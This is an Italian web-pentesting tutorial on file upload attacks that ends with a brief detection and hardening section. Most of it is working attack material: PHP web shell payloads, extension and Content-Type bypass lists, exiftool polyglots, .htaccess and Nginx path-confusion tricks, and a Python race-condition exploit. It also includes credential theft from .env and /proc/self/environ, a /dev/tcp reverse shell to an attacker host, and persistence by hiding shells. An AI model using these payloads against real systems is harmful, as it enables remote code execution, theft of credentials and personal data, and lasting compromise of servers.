---
title: 'File Upload Attack: Bypass, Polyglot e Web Shell'
slug: file-upload-attack
description: >-
  Scopri come sfruttare un file upload attack nel pentesting web: bypass
  estensione, Content-Type, magic bytes, polyglot e RCE via web shell.
image: /file-upload-attack.webp
draft: false
date: 2026-03-15T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - web shell
---

Ogni applicazione web moderna ha un upload: immagine profilo, allegato email, CV in PDF, documento di identità, fattura. Lo sviluppatore implementa un filtro — controlla l'estensione, il Content-Type, i magic bytes. L'attaccante bypassa il filtro. Carica un file che **sembra** un'immagine ma **è** codice PHP. Il web server lo esegue. Da quel momento l'attaccante ha una [web shell](https://hackita.it/articoli/web-shell) — una shell permanente accessibile da qualsiasi browser, senza VPN, senza reverse connection, senza lasciare tracce di connessione.

Il File Upload Attack è tra le vulnerabilità più gratificanti nel penetration testing perché il risultato è **RCE immediata e persistente**. Non è un'injection che devi rifare ogni volta — la shell resta lì, disponibile, finché qualcuno non la trova e la cancella. E con le tecniche giuste (polyglot con exiftool, .htaccess overwrite, Nginx path confusion), anche i filtri più sofisticati si bypassano.

La trovo nel **15% dei pentest web**. Il dato che fa riflettere: nel **60% dei casi** il filtro è solo client-side (JavaScript nel browser) e basta Burp Suite per bypassarlo completamente. Nel restante 40% con filtri server-side, il bypass richiede più tecnica ma riesce nel **70% dei casi** usando le tecniche combinate di questa guida.

Satellite operativo della [guida pillar File & Path Attacks](https://hackita.it/articoli/file-path-attacks-guida-completa).

## Cos'è il File Upload Attack?

Un File Upload Attack sfrutta la funzionalità di upload dell'applicazione per caricare **file eseguibili** (PHP, JSP, ASP, ASPX) che il web server interpreterà come codice. L'obiettivo è ottenere RCE caricando una [web shell](https://hackita.it/articoli/web-shell) raggiungibile via browser nella document root. L'attaccante bypassa i controlli sull'estensione, il Content-Type e i magic bytes del file per far accettare un file malevolo che l'applicazione tratta come legittimo.

> **Il File Upload Attack è pericoloso?**
> Sì — porta a **RCE diretta e persistente** tramite web shell. Una volta caricata e raggiungibile, l'attaccante ha accesso permanente al server da qualsiasi browser nel mondo. Trovato nel **15% dei pentest web**. Il 60% dei filtri è solo client-side — bypass in 10 secondi con Burp.

## Come Verificare — Discovery

```bash
# Identifica le funzionalità di upload
# In Burp Suite: cerca request POST con Content-Type: multipart/form-data
# Funzionalità tipiche:
# - Immagine profilo / avatar
# - Upload documenti (CV, fatture, contratti)
# - Allegati (email, ticket, chat)
# - Import file (CSV, Excel, XML)
# - Upload media (immagini, video per CMS)
# - Plugin / temi (WordPress, Joomla)

# Nuclei
nuclei -u https://target.com -tags upload,fileupload
```

***

## Bypass Estensione — La Lista Completa Per Ogni Web Server

Il primo filtro che incontri è sull'estensione del file. Ecco tutte le varianti per bypassarlo:

### PHP (Apache, Nginx+PHP-FPM)

```bash
shell.php              # Diretto (se nessun filtro)
shell.php5             # PHP 5 extension
shell.phtml            # PHP HTML
shell.phar             # PHP Archive
shell.pht              # PHP HTML Template
shell.phps             # PHP Source (a volte eseguito)
shell.pgif             # PHP GIF
shell.shtml            # Server-Side Includes
shell.inc              # Include file (a volte eseguito)
shell.pHp              # Case variation
shell.PHP              # Uppercase
shell.Php5             # Mixed case
shell.php.jpg          # Double extension (Apache)
shell.php.png          # Double extension
shell.php.gif          # Double extension
shell.php%00.jpg       # Null byte (PHP < 5.3.4)
shell.php%20           # Trailing space
shell.php.             # Trailing dot (Windows rimuove)
shell.php::$DATA       # NTFS ADS (Windows IIS)
shell.php%0a           # Newline
shell.php%0a.jpg       # Newline + estensione
shell.php\x00.jpg      # Null byte raw
```

### JSP (Tomcat)

```bash
shell.jsp
shell.jspx
shell.jsw
shell.jsv
shell.jtml
shell.war              # Web Application Archive (auto-deploy!)
```

### ASP / ASPX (IIS)

```bash
shell.asp
shell.aspx
shell.ashx             # Generic handler
shell.asmx             # Web service
shell.cer              # Certificate (eseguito come ASP su IIS)
shell.config           # Con codice ASP inline
shell.asp;.jpg         # IIS semicolon trick
shell.asp%00.jpg       # Null byte
web.config             # Overwrite config IIS
```

***

## Bypass Content-Type — In Burp Suite

L'applicazione controlla il `Content-Type` nella request multipart. Cambialo in Burp:

```bash
# ORIGINALE (bloccato):
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

# BYPASS — simula un'immagine:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

# Content-Type che bypassano i filtri:
image/jpeg
image/png
image/gif
image/svg+xml
image/webp
application/pdf
application/octet-stream    # Generico — spesso accettato
text/plain
```

### Verifica con curl

```bash
# Upload con Content-Type falsificato
curl -X POST "https://target.com/upload" \
  -H "Cookie: session=abc123" \
  -F "file=@shell.php;type=image/jpeg"

# Il flag type= di curl imposta il Content-Type del file nel multipart
```

***

## Bypass Magic Bytes — Polyglot Files Reali

I magic bytes sono i primi byte di un file che identificano il formato. Se l'applicazione li controlla, il file deve **iniziare** con i magic bytes giusti:

### Magic bytes manuali

```bash
# GIF (il più semplice e affidabile)
echo -n 'GIF89a<?php system($_GET["c"]); ?>' > shell.php.gif
# I primi 6 bytes "GIF89a" superano il check magic bytes
# Il PHP dopo viene eseguito se il file è interpretato come PHP

# JPEG
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF' > shell.php.jpg
echo '<?php system($_GET["c"]); ?>' >> shell.php.jpg

# PNG
printf '\x89PNG\r\n\x1a\n' > shell.php.png
echo '<?php system($_GET["c"]); ?>' >> shell.php.png

# BMP
printf '\x42\x4D' > shell.php.bmp
echo '<?php system($_GET["c"]); ?>' >> shell.php.bmp

# PDF
printf '%%PDF-1.4\n<?php system($_GET["c"]); ?>' > shell.php.pdf
```

***

## Polyglot Avanzati con exiftool — Il Bypass Definitivo

Il polyglot con exiftool è la tecnica che uso più spesso nei pentest reali. Il file risultante è **un'immagine JPEG valida** — si apre correttamente in qualsiasi viewer, supera tutti i controlli di formato — E contiene codice PHP nei metadata EXIF che viene eseguito se il server lo interpreta come PHP.

### Creazione step by step

```bash
# === STEP 1: Prendi un'immagine legittima (o creane una) ===
# Usa un'immagine reale — i tool di validazione la analizzano a fondo
convert -size 100x100 xc:red legit.jpg
# O usa qualsiasi JPG dal web

# === STEP 2: Inietta PHP nel commento EXIF ===
exiftool -Comment='<?php system($_GET["c"]); ?>' legit.jpg
# exiftool modifica solo i metadata — l'immagine resta valida!

# === STEP 3: Verifica che il PHP è iniettato ===
exiftool legit.jpg | grep Comment
# Comment: <?php system($_GET["c"]); ?>

# === STEP 4: Verifica che l'immagine è ancora valida ===
file legit.jpg
# legit.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI)...
# → L'immagine è perfettamente valida

identify legit.jpg
# legit.jpg JPEG 100x100 100x100+0+0 8-bit sRGB 2.51KB
# → ImageMagick la riconosce come JPEG valida

# === STEP 5: Rinomina per il target ===
cp legit.jpg shell.php.jpg        # Per Apache double extension
cp legit.jpg shell.phtml          # Per estensione alternativa
cp legit.jpg avatar.jpg           # Se poi usi .htaccess o Nginx confusion
```

### Polyglot GIF con exiftool

```bash
# Per sistemi che accettano solo GIF
convert -size 1x1 xc:white image.gif
exiftool -Comment='<?php system($_GET["c"]); ?>' image.gif
cp image.gif shell.php.gif
cp image.gif shell.gif
```

### Polyglot PNG con chunk tEXt

```bash
# PNG ha chunk di testo dove iniettare PHP
exiftool -Comment='<?php system($_GET["c"]); ?>' image.png
# O inserisci in altri campi EXIF:
exiftool -DocumentName='<?php system($_GET["c"]); ?>' image.png
exiftool -ImageDescription='<?php system($_GET["c"]); ?>' image.png
```

### Perché i polyglot funzionano

L'applicazione valida il file come immagine → tutti i check passano (magic bytes, formato, dimensioni, pixel). Ma quando Apache/Nginx serve il file e PHP-FPM lo interpreta (a causa dell'estensione .php o di una misconfiguration), PHP ignora i dati binari dell'immagine e esegue il codice tra `<?php` e `?>`. Il file è **contemporaneamente** un'immagine valida e un PHP eseguibile.

***

## .htaccess Overwrite — RCE Tramite Qualsiasi Estensione

Se puoi caricare un file `.htaccess` nella directory di upload, puoi far eseguire **qualsiasi estensione** come PHP:

```bash
# === STEP 1: Carica .htaccess ===
# Contenuto:
AddType application/x-httpd-php .jpg .gif .png

# O più mirato:
<Files "avatar.jpg">
  SetHandler application/x-httpd-php
</Files>

# === STEP 2: Carica la shell con estensione immagine ===
# avatar.jpg contiene: <?php system($_GET["c"]); ?>
# L'applicazione accetta .jpg → nessun filtro triggato
# Apache esegue .jpg come PHP grazie a .htaccess → RCE!

# Upload .htaccess con curl
echo 'AddType application/x-httpd-php .jpg' > .htaccess
curl -X POST "https://target.com/upload" \
  -F "file=@.htaccess;type=text/plain"
```

***

## Nginx + PHP-FPM Path Confusion — Il Bypass Elegante

Con `cgi.fix_pathinfo=1` (default in PHP!), Nginx passa a PHP-FPM qualsiasi URL che contiene `.php` nel path. Se il file prima di `.php` non esiste, PHP-FPM risale al file precedente nel path e lo esegue come PHP:

```bash
# === Prerequisito ===
# Nginx con location ~ \.php$ { fastcgi_pass php-fpm; }
# PHP con cgi.fix_pathinfo=1 (default!)

# === STEP 1: Carica un'immagine legittima con PHP nei metadata ===
exiftool -Comment='<?php system($_GET["c"]); ?>' avatar.jpg
curl -X POST "https://target.com/profile/avatar" -F "file=@avatar.jpg"
# L'immagine viene salvata come /uploads/avatars/avatar.jpg

# === STEP 2: Accedi con path confusion ===
curl "https://target.com/uploads/avatars/avatar.jpg/.php?c=id"
# O:
curl "https://target.com/uploads/avatars/avatar.jpg/anything.php?c=id"

# Cosa succede:
# 1. Nginx vede .php → passa a PHP-FPM
# 2. PHP-FPM cerca "anything.php" → non esiste
# 3. Con fix_pathinfo=1, risale a "avatar.jpg"
# 4. Esegue avatar.jpg come PHP
# 5. Il PHP nei metadata EXIF viene eseguito → RCE!

# Output:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

***

## Race Condition Upload — Vincere la Corsa Contro il Filtro

Alcune applicazioni: caricano → validano → se non valido cancellano. Ma tra upload e cancellazione c'è una finestra temporale di millisecondi. Se fai abbastanza request parallele, la shell viene eseguita prima della cancellazione:

```python
#!/usr/bin/env python3
"""race_upload.py — Race condition file upload exploit"""

import threading
import requests
import sys

TARGET = "https://target.com"
UPLOAD_URL = f"{TARGET}/api/upload"
SHELL_PATH = "/uploads/shell.php"
SHELL_URL = f"{TARGET}{SHELL_PATH}?c=id"
COOKIE = {"session": "abc123"}
FOUND = threading.Event()

def upload():
    """Upload continuo della shell"""
    while not FOUND.is_set():
        files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>', 'image/jpeg')}
        try:
            requests.post(UPLOAD_URL, files=files, cookies=COOKIE, timeout=2)
        except:
            pass

def trigger():
    """Request continua verso la shell"""
    while not FOUND.is_set():
        try:
            r = requests.get(SHELL_URL, timeout=1)
            if "uid=" in r.text:
                print(f"\n[+] RCE CONFIRMED!")
                print(f"[+] Output: {r.text.strip()}")
                FOUND.set()
                return
        except:
            pass

print(f"[*] Target: {TARGET}")
print(f"[*] Starting race condition exploit...")
print(f"[*] Upload threads: 20, Trigger threads: 10")

for _ in range(20):
    threading.Thread(target=upload, daemon=True).start()
for _ in range(10):
    threading.Thread(target=trigger, daemon=True).start()

try:
    FOUND.wait(timeout=120)
    if not FOUND.is_set():
        print("[-] Timeout — race condition non sfruttabile o path diverso")
except KeyboardInterrupt:
    print("\n[!] Interrupted")
```

***

## WAF Bypass Upload — Tecniche Avanzate

### Content-Disposition Manipulation

```bash
# Spazio prima di =
Content-Disposition: form-data; name="file"; filename ="shell.php"

# Double filename (il WAF prende il primo, l'app il secondo)
Content-Disposition: form-data; name="file"; filename="safe.jpg"; filename="shell.php"

# UTF-8 encoding
Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php

# Quote variation
Content-Disposition: form-data; name="file"; filename='shell.php'
Content-Disposition: form-data; name="file"; filename=shell.php
Content-Disposition: form-data; name="file"; filename="shell.php

# Filename con path (alcuni server prendono solo il basename)
Content-Disposition: form-data; name="file"; filename="..\..\..\..\var\www\html\shell.php"
Content-Disposition: form-data; name="file"; filename="/var/www/html/shell.php"
```

### Boundary Manipulation

```bash
# Il WAF parsa il multipart usando il boundary
# Modifica il boundary per confonderlo:

# Boundary con spazi
Content-Type: multipart/form-data; boundary =myboundary

# Boundary duplicato
Content-Type: multipart/form-data; boundary=fake; boundary=real

# Boundary con caratteri speciali
Content-Type: multipart/form-data; boundary="my;boundary"

# Boundary molto lungo
Content-Type: multipart/form-data; boundary=AAAA....(1000 chars)....AAAA
```

### Chunked Transfer Encoding

```bash
# Il WAF non ricostruisce i chunk — vede frammenti innocui
Transfer-Encoding: chunked

4
shel
4
l.ph
1
p
0

# Il server ricostruisce: "shell.php"
# Ma il WAF ha visto solo "shel", "l.ph", "p" — nessun match
```

### Double Upload in una request

```bash
# Prima parte: file legittimo (il WAF lo analizza e lo accetta)
# Seconda parte: shell (il WAF ha già dato OK)
--boundary
Content-Disposition: form-data; name="file"; filename="safe.jpg"
Content-Type: image/jpeg

[JPEG data]
--boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET["c"]); ?>
--boundary--
```

***

## Upload Path Discovery — Trovare Dove Finisce il File

Hai caricato la shell ma non sai dove il server l'ha salvata. Queste tecniche la trovano:

### ffuf per directory di upload

```bash
# Cerca la shell in directory comuni
ffuf -u "https://target.com/FUZZ/shell.php" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200 \
  -mr "uid=\|<\?php"

# Directory comuni di upload:
# /uploads/
# /upload/
# /files/
# /media/
# /images/
# /img/
# /assets/uploads/
# /content/uploads/
# /wp-content/uploads/
# /static/uploads/
# /public/uploads/
# /data/
# /tmp/
# /storage/
# /attachments/
```

### ffuf per il nome file

```bash
# Se l'applicazione rinomina il file:
ffuf -u "https://target.com/uploads/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,php5,phtml,phar,jsp,asp,aspx,jpg.php \
  -mc 200 \
  -fs 0

# Pattern di rinomina comuni:
# UUID: /uploads/a1b2c3d4-e5f6-7890-abcd-ef1234567890.php
# Timestamp: /uploads/1708300800_shell.php
# Hash: /uploads/d41d8cd98f00b204e9800998ecf8427e.php
# User ID: /uploads/user_1337/shell.php
```

### Dalla response dell'upload

```bash
# La response dell'upload spesso contiene il path:
# {"status": "success", "path": "/uploads/user123/avatar.php.jpg"}
# {"url": "https://target.com/files/a1b2c3d4.php"}

# Controlla anche:
# - Header Location nel redirect post-upload
# - HTML della pagina profilo (src= dell'immagine)
# - Inspect Element sull'immagine profilo caricata
```

### Bruteforce con gobuster

```bash
gobuster dir -u https://target.com/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php -s 200 \
  --wildcard \
  -t 50
```

***

## Workflow Reale — Dal Form Di Upload Alla Shell

### Step 1 → Identifica la funzionalità di upload

```bash
# In Burp Suite: cerca request POST multipart
# Intercetta un upload legittimo → analizza la response
# Nota: filename, Content-Type, directory di destinazione
```

### Step 2 → Testa estensione diretta

```bash
# Prova a caricare shell.php direttamente
# Se accettato → vai a Step 6 (RCE!)
# Se bloccato → Step 3
```

### Step 3 → Testa bypass estensione

```bash
# In ordine di probabilità:
shell.php.jpg          # Double extension
shell.phtml            # Extension alternativa
shell.pHp              # Case variation
shell.php5             # PHP5
shell.phar             # PHP Archive
shell.php%00.jpg       # Null byte (PHP vecchi)
shell.php.             # Trailing dot (Windows)
# Se uno passa → Step 5
# Se tutti bloccati → Step 4
```

### Step 4 → Bypass Content-Type + Magic Bytes + Polyglot

```bash
# a) Content-Type spoofing in Burp:
# Cambia Content-Type: application/x-php → image/jpeg

# b) Magic bytes:
echo -n 'GIF89a<?php system($_GET["c"]); ?>' > shell.php.gif

# c) Polyglot con exiftool (il più affidabile):
exiftool -Comment='<?php system($_GET["c"]); ?>' real_photo.jpg
mv real_photo.jpg shell.php.jpg

# d) .htaccess overwrite:
# Carica .htaccess con: AddType application/x-httpd-php .jpg
# Poi carica shell.jpg

# e) Nginx path confusion:
# Carica polyglot come avatar.jpg
# Accedi a: /uploads/avatar.jpg/.php
```

### Step 5 → Trova il path della shell caricata

```bash
# Controlla la response dell'upload
# Controlla l'HTML della pagina (src dell'immagine)
# ffuf per directory comuni:
ffuf -u "https://target.com/FUZZ/shell.php.jpg" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200
```

### Step 6 → RCE

```bash
curl -s "https://target.com/uploads/shell.php.jpg?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl -s "https://target.com/uploads/shell.php.jpg?c=cat+/etc/passwd"
# root:x:0:0:root:/root:/bin/bash
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
# deploy:x:1000:1000::/home/deploy:/bin/bash

curl -s "https://target.com/uploads/shell.php.jpg?c=cat+/app/.env"
# DB_PASSWORD=Pr0d_S3cret!
# AWS_ACCESS_KEY_ID=AKIA...
```

### Step 7 → Reverse shell

```bash
# Listener
nc -lvnp 4444

# Trigger
curl "https://target.com/uploads/shell.php.jpg?c=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"

# Output sul listener:
# connect to [ATTACKER] from (UNKNOWN) [TARGET_IP] 54321
# www-data@web-prod:/var/www/html/uploads$
```

***

## Output Reale — Proof Step by Step

### Upload con Burp

```
POST /api/profile/avatar HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="shell.phtml"
Content-Type: image/jpeg

GIF89a<?php system($_GET["c"]); ?>
------WebKitFormBoundary--
```

### Response dell'upload

```
HTTP/1.1 200 OK
Content-Type: application/json

{"status":"success","message":"Avatar updated","url":"/uploads/avatars/user_1337_shell.phtml"}
```

### RCE confermata

```bash
curl "https://target.com/uploads/avatars/user_1337_shell.phtml?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl "https://target.com/uploads/avatars/user_1337_shell.phtml?c=uname+-a"
# Linux web-prod-01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux

curl "https://target.com/uploads/avatars/user_1337_shell.phtml?c=cat+/proc/self/environ"
# HOSTNAME=web-prod-01AWS_ACCESS_KEY_ID=AKIA...AWS_SECRET_ACCESS_KEY=wJalrX...
```

***

## 🏢 Enterprise Escalation

### Upload → Cloud Takeover

```
File Upload → Web Shell → RCE www-data
→ cat /proc/self/environ → AWS creds
→ aws s3 ls → backup bucket
→ aws secretsmanager list-secrets → DB password
→ CLOUD COMPROMISE
```

### Upload → Domain Admin (Windows IIS)

```
File Upload → shell.aspx → RCE IIS AppPool
→ whoami /priv → SeImpersonatePrivilege
→ PrintSpoofer → NT AUTHORITY\SYSTEM
→ mimikatz → domain cached creds
→ DCSync → DOMAIN ADMIN
```

### Upload → Persistence

```
Web Shell → copia in 5 location nascoste:
/uploads/.thumbs.php
/images/.cache.php
/css/style.php
/js/analytics.php
→ inject backdoor in index.php esistente
→ cron reverse shell
→ PERSISTENCE anche dopo patch dell'upload
```

## 🔌 Variante API / Microservizi 2026

```json
// API upload con multipart
POST /api/v2/files/upload
Content-Type: multipart/form-data
file: shell.phtml (Content-Type: image/jpeg)

// API upload con base64
POST /api/v2/avatar
{"image": "R0lGODlhAQABAIAAAP///wAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==<?php system($_GET['c']); ?>", "filename": "avatar.php.gif"}

// API import con URL (RFI-like)
POST /api/v2/import/url
{"url": "http://attacker.com/shell.txt", "save_as": "shell.php"}

// GraphQL upload
mutation {
  uploadFile(file: Upload!, filename: "shell.phtml") {
    path
  }
}
```

***

## Micro Playbook Reale

**Minuto 0-2 →** Intercetta upload legittimo in Burp → analizza filtri
**Minuto 2-5 →** Test estensione: `.php`, `.phtml`, `.php.jpg`, `.pHp`, `.php5`
**Minuto 5-7 →** Test Content-Type: cambia in `image/jpeg` in Burp
**Minuto 7-10 →** Test magic bytes: `GIF89a<?php...?>` o polyglot exiftool
**Minuto 10-12 →** Se tutto bloccato: `.htaccess` overwrite o Nginx path confusion
**Minuto 12-15 →** Trova path: response upload, ffuf, inspect element
**Minuto 15-17 →** `?c=id` → conferma RCE → reverse shell

**Shell in 17 minuti** dal primo upload.

## Caso Studio Concreto

**Settore:** Portale job posting, 10.000 CV, stack LAMP.
**Scope:** Black-box.

Upload CV accettava PDF. Il filtro controllava solo `Content-Type` (lato server) e estensione (lato client, JavaScript). In Burp: ho rimosso la validazione JS, cambiato `Content-Type` in `application/pdf`, e rinominato `shell.php` → il server accettava in base al `Content-Type`, ma salvava il file con il nome originale `shell.php`. Path nell'HTML: `/uploads/cv/shell.php`.

```bash
curl "https://target.com/uploads/cv/shell.php?c=id"
# uid=33(www-data) gid=33(www-data)
```

Dalla shell: `/var/www/html/.env` con credenziali MySQL. Database: 10.000 CV con nome, email, telefono, indirizzo, esperienza lavorativa. API key SendGrid (email transazionali) e credenziali AWS S3 (bucket con i PDF originali dei CV).

**Tempo dall'upload alla RCE:** 8 minuti.
**Root cause:** validazione Content-Type ma non dell'estensione reale lato server.

***

## Errori Comuni Reali

**1. Filtro solo client-side (60% dei casi)**
JavaScript nel browser controlla l'estensione. L'attaccante usa Burp/curl e bypassa tutto.

**2. Content-Type check senza validazione estensione**
L'app verifica che il Content-Type sia `image/jpeg` ma salva il file come `.php`.

**3. Directory upload con esecuzione PHP abilitata**
`/uploads/` senza `php_flag engine off` → qualsiasi PHP caricato viene eseguito.

**4. `cgi.fix_pathinfo=1` (default PHP!)**
Con Nginx, qualsiasi file diventa eseguibile come PHP con il path confusion trick.

**5. Filename dal client usato senza sanitizzazione**
Il server salva il file con il nome fornito dall'utente → double extension, null byte, path traversal nel nome.

**6. Solo check sul primo file nel multipart**
L'app valida il primo file nella request multipart ma ignora i successivi.

***

## Indicatori di Compromissione (IoC)

* File con estensioni eseguibili in directory di upload (`.php`, `.jsp`, `.asp` dove dovrebbero esserci solo immagini)
* File con dimensione anomala (una "immagine" di 29 bytes = web shell)
* File con timestamp diverso dal deploy dell'applicazione
* Request GET/POST con parametri sospetti (`?c=`, `?cmd=`, `?command=`) verso file in `/uploads/`
* Processi `bash`/`sh`/`cmd` figli del processo web dopo request verso file uploadati
* `.htaccess` in directory di upload (non dovrebbe mai esserci)
* File con magic bytes di immagine ma contenuto PHP (polyglot)

***

## ✅ Checklist Finale — File Upload Testing

```
ESTENSIONE
☐ .php diretto
☐ .php5, .phtml, .phar, .pht (alternative)
☐ .pHp, .PHP (case variation)
☐ .php.jpg, .php.png (double extension)
☐ .php%00.jpg (null byte — PHP vecchi)
☐ .php., .php%20, .php::$DATA (trailing chars)
☐ .asp;.jpg (IIS semicolon)

CONTENT-TYPE
☐ Cambiato in image/jpeg
☐ Cambiato in image/png
☐ Cambiato in application/octet-stream

MAGIC BYTES
☐ GIF89a + PHP
☐ JPEG header + PHP
☐ PNG header + PHP
☐ Polyglot con exiftool (immagine reale + PHP in EXIF)

TECNICHE AVANZATE
☐ .htaccess upload → esecuzione .jpg come PHP
☐ Nginx path confusion (.jpg/.php)
☐ Race condition (upload + request parallele)
☐ Content-Disposition manipulation
☐ Boundary manipulation
☐ Double upload in una request
☐ Chunked encoding

PATH DISCOVERY
☐ Response dell'upload analizzata
☐ HTML della pagina ispezionato (src immagine)
☐ ffuf per directory comuni (/uploads/, /files/, /images/)
☐ ffuf per il file (con estensioni)

RCE & POST-EXPLOIT
☐ ?c=id eseguito
☐ /etc/passwd letto
☐ .env / config letto → credenziali estratte
☐ /proc/self/environ → credenziali cloud
☐ Reverse shell stabilita (se necessaria)
☐ Persistence: shell copiata in location multiple
```

***

## Detection & Hardening

* **Valida LATO SERVER**: estensione (whitelist), Content-Type, magic bytes, dimensione, contenuto
* **Rinomina il file**: usa UUID + estensione dalla whitelist (`a1b2c3d4.jpg`)
* **Salva fuori dalla document root**: `/var/uploads/` non servito dal web server
* **Servi via proxy**: l'utente scarica da `/api/files/UUID`, il web server non serve la directory di upload
* **Disabilita esecuzione PHP nella directory upload**: `php_flag engine off` in `.htaccess` o `location` block in Nginx
* **`cgi.fix_pathinfo=0`** in `php.ini` — blocca il path confusion Nginx
* **Content-Disposition: attachment** — forza il download, non l'esecuzione nel browser
* **Non accettare .htaccess nell'upload** — blacklist esplicita dei file pericolosi

```php
// ✅ SICURO — upload PHP
$allowed_ext = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
$allowed_mime = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];

$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
$mime = mime_content_type($_FILES['file']['tmp_name']);

if (!in_array($ext, $allowed_ext) || !in_array($mime, $allowed_mime)) {
    die("File type not allowed");
}

// Rinomina con UUID
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
$dest = '/var/uploads/' . $new_name;  // Fuori dalla document root!
move_uploaded_file($_FILES['file']['tmp_name'], $dest);
```

***

Satellite della [Guida Completa File & Path Attacks](https://hackita.it/articoli/file-path-attacks-guida-completa). Vedi anche: [Web Shell](https://hackita.it/articoli/web-shell), [LFI](https://hackita.it/articoli/lfi), [Path Traversal](https://hackita.it/articoli/path-traversal).

> I tuoi upload validano lato server? La directory di upload è eseguibile? `cgi.fix_pathinfo` è a 1? [Penetration test applicativo HackIta](https://hackita.it/servizi) per trovare ogni vettore di upload prima degli attaccanti. Per padroneggiare il bypass dal polyglot alla shell: [formazione 1:1](https://hackita.it/formazione).
